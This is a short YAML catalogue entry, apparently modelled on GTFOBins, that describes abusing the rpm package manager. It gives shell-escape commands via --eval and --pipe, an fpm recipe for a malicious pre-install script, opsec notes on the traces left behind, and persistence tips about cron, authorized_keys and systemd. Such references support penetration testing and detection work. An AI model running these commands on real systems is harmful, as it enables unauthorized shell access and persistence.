---
name: rpm
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: rpm -ivh x-1.0-1.noarch.rpm
  notes: |-
    Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

    ```
    echo /path/to/command >x.sh
    fpm -n x -s dir -t rpm -a all --before-install x.sh .
    ```
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: rpm --eval '%(/bin/sh 1>&2)'
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: rpm --pipe '/bin/sh 0<&1'
references:
- https://gtfobins.github.io/gtfobins/rpm/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
